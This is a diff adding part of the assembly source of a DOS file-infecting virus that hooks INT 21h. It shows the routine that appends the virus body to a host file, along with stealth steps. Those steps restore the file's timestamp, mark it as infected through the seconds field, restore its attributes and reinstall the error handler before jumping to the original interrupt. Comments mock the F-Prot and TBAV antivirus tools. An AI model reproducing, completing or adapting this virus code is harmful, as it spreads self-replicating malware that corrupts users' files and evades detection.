@@ -1,0 +1,88 @@
+inc di
+inc di                             ;the virus code                  
+loop enc2                          ;              
+;--------------------------------------------
+mov ah,40h                       ;  
+mov cx,offset fin - offset start ;copy the virus              
+mov dx,offset fin + 50           ;to end of file
+int 21h                          ;
+;----------------------------------------------------------                                          
+cerrar:                          ;
+                                 ;restore the       
+mov ax,5701h                     ;date and time    
+mov cx,word ptr cs:[hora]        ;file   
+mov dx,word ptr cs:[dia]         ;     
+or cx,word ptr cs:[fecha]        ;and mark the seconds  
+int 21h                          ; 
+;----------------------------------------------------------                                          
+mov ah,3eh                       ; 
+int 21h                          ;close the file
+;----------------------------------------------------------                                          
+pop ds                           ;
+pop es                           ;restore the 
+pop bp                           ;registers
+pop di                           ; 
+pop si                           ;
+popa                             ;
+popf                             ;
+;----------------------------------------------------------                                          
+pusha                           ;   
+                                ;                                                             
+mov ax,4301h                    ;restores the atributes 
+mov cx,word ptr cs:[attrib]     ;of the file  
+int 21h                         ;   
+                                ;
+popa                            ; 
+;----------------------------------------------------------                                          
+pushf                           ;                           
+pusha                           ; 8-(  = f-prot                       
+push si                         ;                       
+push di                         ; 8-(  = tbav   
+push bp                         ;                       
+push es                         ; 8-)  = I'm                        
+push ds                         ;                              
+;----------------------------------------------------------                                          
+mov ax,2524H                    ;                         
+lea bx,error                    ;restore the                         
+mov ds,bx                       ;errors handler      
+lea bx,error+2                  ;                         
+int 21h                         ;                       
+;----------------------------------------------------------                                          
+pop ds                          ;
+pop es                          ;
+pop bp                          ;restore the 
+pop di                          ;resgisters
+pop si                          ;
+popa                            ;
+popf                            ;
+;----------------------------------------------------------                                          
+JMP A3                          ;jmp to orig. INT 21
+                                ;
+;**********************************************************
+;           SUBRUTINES AREA
+;**********************************************************
+                                ;
+movedor:                        ;   
+                                ; 
+xor cx,cx                       ;use to move file pointer         
+xor dx,dx                       ;       
+int 21h                         ;        
+ret                             ;        
+;----------------------------------------------------------                                          
+all:                            ;  
+                                ; 
+XOR AL,AL                       ;use to set 
+iret                            ;error flag
+
+;***********************************************************
+;         DATA AREA
+;***********************************************************
+largo  dw  ?
+jump   db  0e9h
+real   db  0cdh,20h,0
+hora   dw  ?
+dia    dw  ?
+attrib dw  ?
+int21  dd  ?
+error  dd  ?
+
